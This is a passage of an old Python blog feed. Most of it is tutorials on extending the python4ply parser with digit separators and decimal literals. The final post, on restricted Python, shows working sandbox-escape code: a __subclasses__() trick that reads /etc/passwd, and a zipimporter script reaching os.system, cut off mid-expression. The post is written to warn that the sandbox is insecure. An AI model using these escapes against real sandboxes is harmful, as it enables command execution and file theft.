+&lt;a href="http://dalkescientific.com/Python/python4ply-tutorial.html"&gt;tutorial&lt;/a&gt;.
+python4ply is a Python parser for the Python language using PLY and
+the 'compiler' module from the standard library to parse Python code
+and generate bytecode for the Python virtual machine.
+
+&lt;/P&gt;
+
+&lt;h2&gt;Syntax support for decimal numbers&lt;/h2&gt;
+
+&lt;P&gt;
+
+How about something more complicated?  Python's "decimal" module is a
+fixed point numeric type using base 10, which is especially useful for
+those dealing with money.  Here's an obvious limitation of doing base
+10 calculations in base 2.  I stole it from the decimal documentation.
+
+&lt;pre class="code"&gt;
+&amp;gt;&amp;gt;&amp;gt; 1.0 % 0.1
+0.09999999999999995
+&amp;gt;&amp;gt;&amp;gt; import decimal
+&amp;gt;&amp;gt;&amp;gt; d = decimal.Decimal("1.0")
+&amp;gt;&amp;gt;&amp;gt; d
+Decimal("1.0")
+&amp;gt;&amp;gt;&amp;gt; d / decimal.Decimal("0.1")
+Decimal("10")
+&amp;gt;&amp;gt;&amp;gt; 
+&lt;/pre&gt;
+
+The normal way to create a decimal number is to "import decimal" then
+use "decimal.Decimal".  I'm going to add grammar-level support so that
+"0d12.3" is the same as decimal.Decimal("12.3").  There's a few
+complications so I'll walk you through how to do this.
+
+&lt;/P&gt;&lt;P&gt;
+
+I need a new DECIMAL token type that matches "0[dD][0-9]+(\.[0-9]+)?".
+This allows "0d1.23" and "0D1" and "0d0.89" but not "0d.2" nor "0d6."
+Feel free to change that if you want.  Bear in mind possible
+ambiguities; does "0d1.x" mean the valid "Decimal('1').x" or the
+syntax error "Decimal('1.') x".  What about "0d1..sqrt()"?
+
+&lt;/P&gt;&lt;P&gt;
+
+Designing a new programming language really means having to pay
+attention to nuances like this.
+
+&lt;/P&gt;&lt;P&gt;
+
+The DECIMAL rule is simple, in part because limitations of what can be
+saved the byte code means the creation of the decimal object must be
+deferred until later.  Just like with the t_BIN_NUMBER rule, this new
+t_DECIMAL rule must go before t_OCT_NUMBER so there's no confusion.
+
+&lt;pre class="code"&gt;
+&lt;b&gt;def t_DECIMAL(t):
+    r"0[dD][0-9]+(\.[0-9]+)?"
+    t.value = t.value[2:]
+    return t&lt;/b&gt;
+
+def t_OCT_NUMBER(t):
+    r"0[0-7]*[lL]?"
+    t.type = "NUMBER"
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+If you save this and try it out on the following program
+
+&lt;pre class="code"&gt;
+# div.py
+print "float", 1.0 % 0.1
+print "decimal", 0d1.0 % 0d0.1
+&lt;/pre&gt;
+
+
+you'll see
+
+&lt;pre class="code"&gt;
+% python compile.py -e div.py
+Traceback (most recent call last):
+  File "compile.py", line 76, in &amp;lt;module&amp;gt;
+    execfile(args[0])
+  File "compile.py", line 43, in execfile
+    tree = python_yacc.parse(text, source_filename)
+  File "/Users/dalke/src/python4ply-1.0/python_yacc.py", line 2607, in parse
+    parse_tree = parser.parse(source, lexer=lexer)
+  File "/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/site-packages/ply/yacc.py", line 237, in parse
+    lookahead = get_token()     # Get the next token
+  File "/Users/dalke/src/python4ply-1.0/python_lex.py", line 657, in token
+    x = self.token_stream.next()
+  File "/Users/dalke/src/python4ply-1.0/python_lex.py", line 609, in add_endmarker
+    for tok in token_stream:
+  File "/Users/dalke/src/python4ply-1.0/python_lex.py", line 534, in synthesize_indentation_tokens
+    for token in token_stream:
+  File "/Users/dalke/src/python4ply-1.0/python_lex.py", line 493, in annotate_indentation_state
+    for token in token_stream:
+  File "/Users/dalke/src/python4ply-1.0/python_lex.py", line 435, in create_strings
+    for tok in token_stream:
+  File "/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/site-packages/ply/lex.py", line 305, in token
+    func.__name__, newtok.type),lexdata[lexpos:])
+ply.lex.LexError: /Users/dalke/src/python4ply-1.0/python_lex.py:203: Rule 't_DECIMAL' returned an unknown token type 'DECIMAL'
+&lt;/pre&gt;
+
+The list of known token type names is given in the 'token' variable,
+defined at the top of python_lex.py.  I'll add "DECIMAL" to the list
+
+&lt;pre class="code"&gt;
+tokens = tuple(python_tokens.tokens) + (
+    "NEWLINE",
+
+    "NUMBER",
+    "NAME",
+    "WS",
+    &lt;b&gt;"DECIMAL",&lt;/b&gt;
+
+    "STRING_START_TRIPLE",
+    "STRING_START_SINGLE",
+     ....
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+With that change I get a new error message.  Whoopie for me!
+
+&lt;pre class="code"&gt;
+% python compile.py -e div.py
+Traceback (most recent call last):
+  File "compile.py", line 76, in &amp;lt;module&amp;gt;
+    execfile(args[0])
+  File "compile.py", line 43, in execfile
+    tree = python_yacc.parse(text, source_filename)
+  File "/Users/dalke/src/python4ply-1.0/python_yacc.py", line 2607, in parse
+    parse_tree = parser.parse(source, lexer=lexer)
+  File "/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/site-packages/ply/yacc.py", line 346, in parse
+    tok = self.errorfunc(errtoken)
+  File "/Users/dalke/src/python4ply-1.0/python_yacc.py", line 2488, in p_error
+    python_lex.raise_syntax_error("invalid syntax", t)
+  File "/Users/dalke/src/python4ply-1.0/python_lex.py", line 27, in raise_syntax_error
+    _raise_error(message, t, SyntaxError)
+  File "/Users/dalke/src/python4ply-1.0/python_lex.py", line 24, in _raise_error
+    raise klass(message, (filename, lineno, offset+1, text))
+  File "div.py", line 3
+    print "decimal", 0d1.0 % 0d0.1
+                     ^
+SyntaxError: invalid syntax
+&lt;/pre&gt;
+
+That's because the parser doesn't know what to do with a DECIMAL.
+What do you think it should it do?  The ast.Const node only takes a
+string or a built-in numeric value.  It doesn't take general Python
+objects because those can't be marshalled into bytecode.
+
+&lt;/P&gt;&lt;P&gt;
+
+I'll wait a moment for you to think about it.
+
+&lt;/P&gt;&lt;P&gt;
+
+Thought enough?  No?  Okay, just a moment more.
+
+&lt;/P&gt;&lt;P&gt;
+
+This new token should correspond to making a new Decimal object at
+that point.  You might think you could be more clever than that and
+create the decimals during module imports, like I will do for the
+regular expression definitions coming later on in this tutorial.  That
+would make the object creation occur only once, instead of once for
+each function call or for every time through a loop.  But a decimal
+object depends on a global/thread-local context, and if I move the
+decimal creation then I might create it in the wrong context.
+
+&lt;/P&gt;&lt;P&gt;
+
+To make my life easier, I'm going to import the Decimal class as the
+super seekret module variable "_$Decimal".  This is a variable name
+that can't occur in normal Python (because of the "$") and which is
+hidden from "... import *" statements (because of the leading "_").
+That way the object creation is mostly a matter of calling
+"_$Decimal(s)" in the right place, which I can only do by constructing
+the AST myself.
+
+&lt;/P&gt;&lt;P&gt;
+
+What will that look like?  I'll use the compiler package to show what
+that AST should look like:
+
+&lt;pre class="code"&gt;
+&amp;gt;&amp;gt;&amp;gt; import compiler
+&amp;gt;&amp;gt;&amp;gt; compiler.parse("from decimal import Decimal as D")
+Module(None, Stmt([From('decimal', [('Decimal', 'D')], 0)]))
+&amp;gt;&amp;gt;&amp;gt; compiler.parse("Decimal('12.345')")
+Module(None, Stmt([Discard(CallFunc(Name('Decimal'),
+[Const('12.345')], None, None))]))
+&amp;gt;&amp;gt;&amp;gt;
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+The new DECIMAL token can go anywhere a NUMBER and NAME can go.
+That's an "atom" in the Python grammar.
+
+&lt;pre class="code"&gt;
+atom: ('(' [yield_expr|testlist_gexp] ')' |
+       '[' [listmaker] ']' |
+       '{' [dictmaker] '}' |
+       '`' testlist1 '`' |
+       NAME | NUMBER | STRING+)
+&lt;/pre&gt;
+
+The last three of these are defined in python_yacc.py as:
+
+&lt;pre class="code"&gt;
+def p_atom_9(p):
+    'atom : NAME'
+    p[0] = ast.Name(p[1])
+    locate(p[0], p.lineno(1))#, text_bounds(p, 1))
+
+def p_atom_10(p):
+    'atom : NUMBER'
+    value, orig_text = p[1]
+    p[0] = ast.Const(value)
+    locate(p[0], p.lineno(1))#, (p.lexpos(1), p.lexpos(1) + len(orig_text)))
+
+def p_atom_11(p):
+    'atom : atom_plus'
+    # get the STRING (atom_plus does the string concatenation)
+    s, lineno, span = p[1]
+    p[0] = ast.Const(s)
+    locate(p[0], lineno)#, span)
+&lt;/pre&gt;
+
+They are simple because the AST nodes are designed for Python.  Nearly
+every token type and statement type maps directly to an AST node.  The
+"locate" function assigns a line number to each created node, and you
+can see some of my experimental work also assign a start and end byte
+location.
+
+&lt;/P&gt;&lt;P&gt;
+
+Here's the new definition for DECIMAL, which is a bit more complex
+because I need to call _$Decimal.  Remember that I can't simply use an
+ast.Const containing a decimal.Decimal because the byte code
+generation only supports strings and numbers.
+
+&lt;pre class="code"&gt;
+&lt;b&gt;def p_atom_12(p):
+    "atom : DECIMAL"
+    decimal_string = p[1]
+    p[0] = ast.CallFunc(ast.Name("_$Decimal"),
+                        [ast.Const(decimal_string)], None, None)
+    locate(p[0], p.lineno(1))&lt;/b&gt;
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+At this point running the code should fail because _$Decimal doesn't
+exist.
+
+&lt;pre class="code"&gt;
+% python compile.py -e div.py
+yacc: Warning. Token 'WS' defined, but not used.
+yacc: Warning. Token 'STRING_START_SINGLE' defined, but not used.
+yacc: Warning. Token 'STRING_START_TRIPLE' defined, but not used.
+yacc: Warning. Token 'STRING_CONTINUE' defined, but not used.
+yacc: Warning. Token 'STRING_END' defined, but not used.
+/Users/dalke/src/python4ply-1.0/python_yacc.py:2473: Warning. Rule 'encoding_decl' defined, but not used.
+yacc: Warning. There are 5 unused tokens.
+yacc: Warning. There is 1 unused rule.
+yacc: Symbol 'encoding_decl' is unreachable.
+yacc: Generating LALR parsing table...
+float 0.1
+decimal
+Traceback (most recent call last):
+  File "compile.py", line 76, in &amp;lt;module&amp;gt;
+    execfile(args[0])
+  File "compile.py", line 48, in execfile
+    exec code in mod.__dict__
+  File "div.py", line 3, in &amp;lt;module&amp;gt;
+    print "decimal", 0d1.0 % 0d0.1
+NameError: name '_$Decimal' is not defined
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+Why are the 'yacc:' messages there?  PLY uses a cached parsing table
+for better performance.  When it notices a change in the grammar it
+invalidates the cache and rebuilds the table based on the new grammar.
+What you're seeing here are the messages from the rebuild.
+
+&lt;/P&gt;&lt;P&gt;
+
+Why is the exception there?  Because the function call uses _$Decimal
+but that name doesn't exist.  Why does it report line 3 even through I
+only assigned a line number to the ast.CallFunc and not the ast.Name,
+which is what acutally failed?  Because the AST generation code in the
+compiler module doesn't always assign line numbers so the byte code
+generation step assumes it's the same as the line number for the
+previously generated instruction.
+
+&lt;/P&gt;&lt;P&gt;
+
+For extra credit, why does the following report the error on line 3
+instead of line 1?
+
+&lt;pre class="code"&gt;
+def p_atom_12(p):
+    "atom : DECIMAL"
+    decimal_string = p[1]
+    p[0] = ast.CallFunc(ast.Name("_$Decimal"),
+                        [ast.Const(decimal_string)], None, None)
+    locate(p[0], 1)  # Why doesn't this report the error on line 1?
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+The last bit of magic is to import the Decimal constructor correctly.
+The root term in the Python grammar is "file_input".  (There's another
+root if you're doing an 'eval'.)  One case is for an empty file and
+the other is for a file that contains statements.  The code as distributed
+looks like this:
+
+&lt;pre class="code"&gt;
+def p_file_input_1(p):
+    "file_input : ENDMARKER"
+    # Empty file
+    stmt = ast.Stmt([])
+    locate(stmt, 1)#, (None, None))
+    p[0] = ast.Module(None, stmt)
+    locate(p[0], 1)#, (None, None))
+
+def p_file_input_2(p):
+    "file_input : file_input_star ENDMARKER"
+    stmt = ast.Stmt(p[1])
+    locate(stmt, p[1][0].lineno)#, bounds(p[1][0], p[1][-1]))
+    docstring, stmt = extract_docstring(stmt)
+    p[0] = ast.Module(docstring, stmt)
+    locate(p[0], 1)#, (None, None))
+&lt;/pre&gt;
+
+By definition the empty file can't have any Decimal statements in it
+so I'll only worry about p_file_input_2.  But I won't worry much.  For
+instance, for now I won't worry that the file can contain __future__
+statements.  These must go before any statement other than the doc
+string.  (If you really want to worry about that then feel free to
+worry.  And also worry that in older Pythons "as" and "with" were not
+reserved words.)
+
+&lt;/P&gt;&lt;P&gt;
+
+I'll insert the new import statement as the first statement in the
+created module.
+
+&lt;pre class="code"&gt;
+def p_file_input_2(p):
+    "file_input : file_input_star ENDMARKER"
+    stmt = ast.Stmt(p[1])
+    locate(stmt, p[1][0].lineno)#, bounds(p[1][0], p[1][-1]))
+    docstring, stmt = extract_docstring(stmt)
+    &lt;b&gt;stmt.nodes.insert(0, ast.From("decimal", [("Decimal", "_$Decimal")], 0))&lt;/b&gt;
+    p[0] = ast.Module(docstring, stmt)
+    locate(p[0], 1)#, (None, None))
+&lt;/pre&gt;
+
+That's it.
+
+&lt;/P&gt;&lt;P&gt;
+
+That was it?
+
+&lt;/P&gt;&lt;P&gt;
+
+Yes, that was it.  Want to see it work?
+
+&lt;pre class="code"&gt;
+% cat div.py
+# div.py
+print "float", 1.0 % 0.1
+print "decimal", 0d1.0 % 0d0.1
+% python compile.py -e div.py
+float 0.1
+decimal 0.0
+% 
+&lt;/pre&gt;
+
+
+&lt;/P&gt;
+
+</description><guid isPermaLink="true">http://www.dalkescientific.com/writings/diary/archive/2008/03/09/python4ply_tutorial_2.html</guid><pubDate>Sun, 09 Mar 2008 12:00:00 GMT</pubDate></item><item><title>python4ply tutorial, part 1</title><link>http://www.dalkescientific.com/writings/diary/archive/2008/03/09/python4ply_tutorial_1.html</link><description>&lt;P&gt;
+
+The following is an except from the
+&lt;a href="http://dalkescientific.com/Python/python4ply.html"&gt;python4ply&lt;/a&gt;
+&lt;a href="http://dalkescientific.com/Python/python4ply-tutorial.html"&gt;tutorial&lt;/a&gt;.
+python4ply is a Python parser for the Python language using PLY and
+the 'compiler' module from the standard library to parse Python code
+and generate bytecode for the Python virtual machine.
+
+&lt;/P&gt;
+
+&lt;h2&gt;What is it python4ply?&lt;/h2&gt;
+
+&lt;P&gt;
+
+&lt;a href="http://dalkescientific.com/Python/python4ply.html"&gt;python4ply&lt;/a&gt; is a Python parser for the Python language.  The grammar
+definition uses &lt;a href="http://www.dabeaz.com/ply/"&gt;PLY&lt;/a&gt;, a parser
+system for Python modelled on yacc/lex.  The parser rules use the "&lt;a
+href="http://docs.python.org/lib/module-compiler.html"&gt;compiler&lt;/a&gt;"
+module from the standard library to build a Python AST and to generate
+byte code for .pyc file.  
+
+&lt;/P&gt;&lt;P&gt;
+
+You might use python4ply to experiment with variations in the Python
+language.  The PLY-based lexer and parser are much easier to change
+than the C implementation Python itself uses or even the ones written
+in Python which are part of the standard library.  This tutorial walks
+through examples of how to make changes in different levels of the
+system.
+
+&lt;/P&gt;&lt;P&gt;
+
+If you only want access to Python's normal AST, which includes line
+numbers and byte position for the code fragements, you should use the
+&lt;a href="http://docs.python.org/lib/ast.html"&gt;_ast&lt;/a&gt; module.
+
+&lt;/P&gt;
+
+&lt;h2&gt;Reminiscing, fabrications, and warnings&lt;/h2&gt;
+
+&lt;P&gt;
+
+Back long time ago I had a class assignment to develop a GUI interface
+using drawpoint and drawtext primitives only.  Everything - buttons,
+text displays, even the mouse pointer itself - was built on those
+primitives.  It gave the strange feeling of knowing that GUIs are
+completely and utterly fake.  There's no there there, and it's only
+through a lot of effort that it feels real.  Those that aren't as old
+and grizzled as I am might get the same feeling with modern web GUIs.
+Those fancy sliders and cool UI effects are built on divs and spans
+and CSS and a lot of hard work.  They aren't really there.
+
+&lt;/P&gt;&lt;P&gt;
+
+This package gives you the same feeling about Python.  It contains a
+Python grammar definition for the PLY parser.  The file python_lex.py
+is the tokenizer, along with some code to synthesize the INDENT,
+DEDENT and ENDMARKER tags.  The file python_yacc.py is the parser.
+The result is an AST compatible with that from the compiler module,
+which you can use to generate Python byte code (".pyc" files).
+
+&lt;/P&gt;&lt;P&gt;
+
+There's also a python_grammer.py file which makes a nearly useless
+concrete syntax tree.  This parser was created by grammar_to_ply.py,
+which converts the Python "Grammar" definition into a form that PLY
+can more easily understand.  I keep it around to make sure that the
+rules in python_yacc.py stay correct.  You might also find it useful
+if you want to port the grammar directly to yacc or some similar
+parser system.
+
+&lt;/P&gt;&lt;P&gt;
+
+What this means is this package gives you, if you put work into it,
+the ability to create a Python variant that works on the Python VM, or
+if you put a lot of work into it (like the Jython, PyPy, and
+IronPython developers), a first step into making your own Python
+implementation.
+
+&lt;/P&gt;&lt;P&gt;
+
+If you think this sounds like a great idea, you're probably wrong.
+Down this path lies madness.  Making a new language isn't just a
+matter of adding a new feature.  The parts go together in subtle ways,
+and if you tweak the language and someone else tweaks the language a
+different way, then you quickly stop being able to talk to each other.
+
+&lt;/P&gt;&lt;P&gt;
+
+Lisp programmers are probably thinking now that this is just a
+half-formed macro system for Python.  They are right.  Once you have an
+AST you can manipulate it in all sorts of ways.  But many experienced
+Lisp programmers will caution against the siren call of macros.  Don't
+make a new language unless you know what dangerous waters you can get
+into.
+
+&lt;/P&gt;&lt;P&gt;
+
+On the other hand, it's a lot fun.  Someone has to make the new cool
+langauge for the future so you've got to practice somewhere.  And
+there are a few times when changing things at the AST or code
+generation levels might make good sense.
+
+&lt;/P&gt;&lt;P&gt;
+
+&lt;a href="http://steve-yegge.blogspot.com/"&gt;Steve Yegge&lt;/a&gt; is right
+when he wrote "&lt;a
+href="http://steve.yegge.googlepages.com/ancient-languages-perl"&gt;When
+you write a compiler, you lose your innocence&lt;/a&gt;."
+
+&lt;/P&gt;
+
+&lt;h2&gt;Getting started&lt;/h2&gt;
+
+&lt;P&gt;
+
+I'll start with the simple thing, to make sure everything works.
+Create the file "owe_me.py" with the following:
+
+&lt;pre class="code"&gt;
+# owe_me.py
+amount = 10000000
+print "You owe me", amount, "dollars"
+&lt;/pre&gt;
+
+To bytecompile it use the provided "compile.py" file.  This is
+similar to "py_compile.py" from the standard library.
+
+&lt;pre class="code"&gt;
+% python compile.py owe_me.py
+Compiling 'owe_me.py'
+% ls -l owe_me.pyc 
+-rw-r--r--   1 dalke  staff  165 Feb 17 19:21 owe_me.pyc
+%
+&lt;/pre&gt;
+
+Running this is a bit tricky because the .pyc file is only used when
+the file is imported as a module.  The easiest way around that is to
+import the module via a comment-line call.
+
+&lt;pre class="code"&gt;
+% python -c 'import owe_me'
+You owe me 10000000 dollars
+%
+&lt;/pre&gt;
+
+(I thought it would be best to use the '-m' option but that seems to
+import the .py file before the .pyc file.  Hmm, I should check into
+that some more.)
+
+&lt;/P&gt;&lt;P&gt;
+
+If you want to prove that it's using the .pyc generated by this
+"compile.py", try renaming the file
+
+&lt;pre class="code"&gt;
+% rm owe_me.pyc
+% python compile.py owe_me.py
+Compiling 'owe_me.py'
+% mv owe_me.pyc you_owe_me.pyc
+% python -c 'import you_owe_me'
+You owe me 10000000 dollars
+%
+&lt;/pre&gt;
+
+The compile module also supports a '-e' mode, which executes the file
+after byte compiling it, instead of saving the byte compiled form to a
+file.
+
+&lt;pre class="code"&gt;
+% python compile.py -e owe_me.py
+You owe me 10000000 dollars
+%
+&lt;/pre&gt;
+
+&lt;/P&gt;
+
+&lt;h2&gt;Numbers like 1_000_000 - changing the lexer&lt;/h2&gt;
+
+&lt;P&gt;
+
+Reading "10000000" is tricky, at least for humans.  Is that 1 million
+or 10 million?  You might be envious of Perl, which supports using "_"
+as a separator in a number
+
+
+&lt;pre class="code"&gt;
+% perl
+$amount = 10_000_000;
+print "You owe me $amount\n";
+^D
+You owe me 10000000
+%
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+You can change the python4ply grammar to support that.  The
+tokenization pattern for base-10 numbers is in python_lex.py in the
+function "t_DEC_NUMBER":
+
+&lt;pre class="code"&gt;
+def t_DEC_NUMBER(t):
+    r'[1-9][0-9]*[lL]?'
+    t.type = "NUMBER"
+    value = t.value
+    if value[-1] in "lL":
+        value = value[:-1]
+        f = long
+    else:
+        f = int
+    t.value = (f(value, 10), t.value)
+    return t
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+Why do I return the 2-tuple of (integer value, original string) in
+t.value?  The python_yacc.py code contains commented out code where
+I'm experimenting with keeping track of the start and end character
+positions for each token and expression.  PLY by default only tracks
+the start position, so I use the string length to get the end
+position.  I'm also theorizing that it will prove useful for those
+doing round-trip conversions and want to keep the number in its
+original presentation.
+
+&lt;/P&gt;&lt;P&gt;
+
+Okay, so change the pattern to allow "_" as a character after the
+first digit, like this:
+
+&lt;pre class="code"&gt;
+    r'[1-9][0-9_]*[lL]?'
+&lt;/pre&gt;
+
+then modify the action to remove the underscore character.  The new
+definition is:
+
+&lt;pre class="code"&gt;
+def t_DEC_NUMBER(t):
+    r"[1-9][0-9]*[lL]?"
+    t.type = "NUMBER"
+    &lt;b&gt;value = t.value.replace("_", "")&lt;/b&gt;
+    if value[-1] in "lL":
+        value = value[:-1]
+        f = long
+    else:
+        f = int
+    t.value = (f(value, 10), t.value)
+    return t
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+To see if it worked I changed owe_me.py to use underscores, and I
+changed the value to prove that I'm using the new file instead of some
+copy of the old
+
+&lt;pre class="code"&gt;
+# owe_me.py
+amount = 20_000_000
+print "You owe me", amount, "dollars"
+&lt;/pre&gt;
+
+&lt;pre class="code"&gt;
+% python compile.py -e owe_me.py
+You owe me 20000000 dollars
+%
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+&lt;a href="http://dalkescientific.blogspot.com/2008/03/python4ply.html"&gt;Questions or comments?&lt;/a&gt;
+
+&lt;/P&gt;
+
+</description><guid isPermaLink="true">http://www.dalkescientific.com/writings/diary/archive/2008/03/09/python4ply_tutorial_1.html</guid><pubDate>Sun, 09 Mar 2008 12:00:00 GMT</pubDate></item><item><title>python4ply</title><link>http://www.dalkescientific.com/writings/diary/archive/2008/03/09/python4ply.html</link><description>&lt;h2&gt;python4ply 1.0&lt;/h2&gt;
+
+&lt;P&gt;
+
+python4ply is a Python parser for the Python language.  The grammar
+definition uses &lt;a href="http://www.dabeaz.com/ply/"&gt;PLY&lt;/a&gt;, a parser
+system for Python modelled on yacc/lex.  The parser rules use the "&lt;a
+href="http://docs.python.org/lib/module-compiler.html"&gt;compiler&lt;/a&gt;"
+module from the standard library to build a Python AST and to generate
+byte code for .pyc file.
+
+&lt;/P&gt;&lt;P&gt;
+
+You might use python4ply to experiment with variations in the Python
+language.  The PLY-based lexer and parser are much easier to change
+than the C implementation Python itself uses or even the ones written
+in Python which are part of the standard library.  This tutorial walks
+through examples of how to make changes in different levels of the
+system
+
+&lt;/P&gt;&lt;P&gt;
+
+To give you an idea of what it can do, here are some examples from the tutorial:
+
+&lt;pre class="code"&gt;
+   &lt;i&gt;  # integers with optional underscores separators &lt;/i&gt;
+amount = 20_000_000
+print "You owe me", amount, "dollars"
+&lt;/pre&gt;
+
+&lt;pre class="code"&gt;
+    &lt;i&gt;  # sytax-level support for decimals&lt;/i&gt;
+% cat div.py
+# div.py
+print "float", 1.0 % 0.1
+print "decimal", 0d1.0 % 0d0.1
+% python compile.py -e div.py
+float 0.1
+decimal 0.0
+% 
+&lt;/pre&gt;
+&lt;pre class="code"&gt;
+    &lt;i&gt;  # Perl-like regex creation and match operator&lt;/i&gt;
+for line in open("python_yacc.py"):
+    if line =~ m/def (?P&lt;name&gt;\w+) *(?P&lt;args&gt;\(.*\)) *:/:
+        print repr($1), repr($args)
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+The primary site for python4ply is &lt;a
+href="http://dalkescientific.com/Python/python4ply.html"&gt;http://dalkescientific.com/Python/python4ply.html&lt;/a&gt;.
+The package is released under the MIT license.
+
+&lt;/P&gt;&lt;P&gt;
+
+Download
+&lt;a href="http://dalkescientific.com/Python/python4ply-1.0.tar.gz"&gt;python4ply-1.0.tar.gz&lt;/a&gt; or view the
+&lt;a href="http://dalkescientific.com/Python/python4ply-tutorial.html"&gt;tutorial&lt;/a&gt;.
+
+&lt;/P&gt;&lt;P&gt;
+&lt;li&gt;&lt;a href="http://dalkescientific.blogspot.com/2008/03/python4ply.html"&gt;Questions or comments?&lt;/a&gt;&lt;/li&gt;
+
+&lt;/P&gt;
+
+</description><guid isPermaLink="true">http://www.dalkescientific.com/writings/diary/archive/2008/03/09/python4ply.html</guid><pubDate>Sun, 09 Mar 2008 12:00:00 GMT</pubDate></item><item><title>Restricted python</title><link>http://www.dalkescientific.com/writings/diary/archive/2008/03/03/restricted_python.html</link><description>&lt;P&gt;
+
+Long time ago there was the thought that Python could support a
+restricted execution mode, where untrusted code could be executed with
+limited capabilities.  Quoting from the &lt;a
+href="http://www.python.org/doc/2.2.3/lib/restricted.html"&gt;Python
+2.2.3 manual&lt;/a&gt;:
+
+&lt;blockquote&gt;
+
+&lt;P&gt;
+
+There exists a class of applications for which this "openness'" is
+inappropriate. Take Grail: a Web browser that accepts "applets,''
+snippets of Python code, from anywhere on the Internet for execution
+on the local system. This can be used to improve the user interface of
+forms, for instance. Since the originator of the code is unknown, it
+is obvious that it cannot be trusted with the full resources of the
+local machine.
+
+&lt;/P&gt;&lt;P&gt;
+
+Restricted execution is the basic framework in Python that allows for
+the segregation of trusted and untrusted code. It is based on the
+notion that trusted Python code (a supervisor) can create a ``padded
+cell' (or environment) with limited permissions, and run the untrusted
+code within this cell. The untrusted code cannot break out of its
+cell, and can only interact with sensitive system resources through
+interfaces defined and managed by the trusted code.
+
+&lt;/P&gt;
+
+&lt;/blockquote&gt;
+
+In practice this didn't work out.  By the time 2.3 came out the &lt;a
+href="http://www.python.org/doc/2.3/lib/restricted.html"&gt;restricted
+execution documentation&lt;/a&gt; said:
+
+&lt;blockquote&gt;
+
+Warning: In Python 2.3 these modules have been disabled due to various
+known and not readily fixable security holes. The modules are still
+documented here to help in reading old code that uses the rexec and
+Bastion modules.
+
+
+&lt;/blockquote&gt;
+
+There were a lot of tricks to get around the problem.  Over time the
+simple ones were patched but the problem is the Python C
+implementation (and probably the Java and .Net ones) weren't designed
+with security in mind.  It's very hard to retrofit security.
+
+&lt;/P&gt;&lt;P&gt;
+
+Some of the restricted environment code stayed in Python.  Here's a
+snippet from the CVS version just before 2.6a1.
+
+&lt;pre class="code"&gt;
+        /* rexec.py can't stop a user from getting the file() constructor --
+           all they have to do is get *any* file object f, and then do
+           type(f).  Here we prevent them from doing damage with it. */
+        if (PyEval_GetRestricted()) {
+                PyErr_SetString(PyExc_IOError,
+                "file() constructor not accessible in restricted mode");
+                f = NULL;
+                goto cleanup;
+        }
+&lt;/pre&gt;
+
+The PyEval_GetRestricted() test checks to see if __builtins__ for the
+current frame is the same as Python's globals.  If not, it's a
+restricted environment.  Here's an example of the same code run in
+each environment:
+
+&lt;pre class="code"&gt;
+&amp;gt;&amp;gt;&amp;gt; exec """print [x for x in ().__class__.__bases__[0].__subclasses__()
+...      if x.__name__ == 'file'][0]('/etc/passwd').read()[:60]"""
+##
+# User Database
+# 
+# Note that this file is consulted whe
+
+
+&amp;gt;&amp;gt;&amp;gt; L = G = dict(__builtins__ = {})
+&amp;gt;&amp;gt;&amp;gt; exec """print [x for x in ().__class__.__bases__[0].__subclasses__()
+...      if x.__name__ == 'file'][0]('/etc/passwd').read()[:60]""" in L, G
+Traceback (most recent call last):
+  File "&amp;lt;stdin&amp;gt;", line 1, in &amp;lt;module&amp;gt;
+  File "&amp;tl;string&amp;gt;", line 1, in &amp;lt;module&amp;gt;
+IOError: file() constructor not accessible in restricted mode
+&amp;gt;&amp;gt;&amp;gt; 
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+Today I saw the recently contributed Python Cookbook Recipe which "&lt;a
+href="http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/550804"&gt;create[s]
+a restricted python function from a string&lt;/a&gt;."  Sounds nice so I
+looked at it.  It basically uses what's left of the old rexec code,
+which is know to be untrustworthy for the general case.
+
+&lt;/P&gt;&lt;P&gt;
+
+For the person who posted the code it's probably good enough, but the
+recipe doesn't include the strong warnings I thought were needed.  I
+added a comment, and to strengthen the comment decided to come up with
+an attack using the default recipe and without using any passed in
+variables.
+
+&lt;/P&gt;&lt;P&gt;
+
+I came close.  If I know the location of an egg which has already been
+loaded and which contains a reference to the 'os' module then I can
+get access to os.system through the zipimporter type.  One such common
+module is 'configobj'.
+
+&lt;pre class="code"&gt;
+# Example attack code using the zipimport type to get around Python's
+# restricted mode checks.
+
+# Must import this otherwise zipimporter will fail because zlib can't
+# be found.  (Reading another zip file fixes that, but then the import
+# fails because it can't find __import__)
+import configobj
+
+
+attack_code = """
+
+all_types = ().__class__.__bases__[0].__subclasses__()
+file = [x for x in all_types if x.__name__ == "file"][0]
+
+# Prove that I'm in restricted mode, or that I'm running
+# on a non-unix-based machine.  This stop is optional
+try:
+    file("/dev/zero")
+except:
+    pass
+else:
+    assert "Was able to open a file!"
+    1/0
+
+zipimport = [x for x in all_types if x.__name__ == "zipimporter"][0]
+
+# Easiest case would be on a system with a python*.zip file
+# because I could import os directly this way.
+
+egg = ("/Library/Frameworks/Python.framework/Versions/2.5/lib/"
+       "python2.5/site-packages/configobj-4.4.0-py2.5.egg")
+loader = zipimport(egg)
+configobj = loader.load_module("configobj")
+os = configobj.os
+
+print "system call:", os.system("ls")
+
+"""
+
+
+L = G = dict(__builtins__ = {})
+exec attack_code in L, G
+&lt;/pre&gt;
+
+This contains comments and some code to verify that I'm really running
+in restricted mode.  Take that out and the attack code is an
+expression that doesn't need to be exec'ed and which doesn't use any
+passed in variables.
+
+&lt;pre class="code"&gt;
+[x for x in ().__class__.__bases__[0].__subclasses__()
+   if x.__name__ == "zipimporter"][0](
+     "/Library/Frameworks/Python.framework/Versions/2.5/lib/"
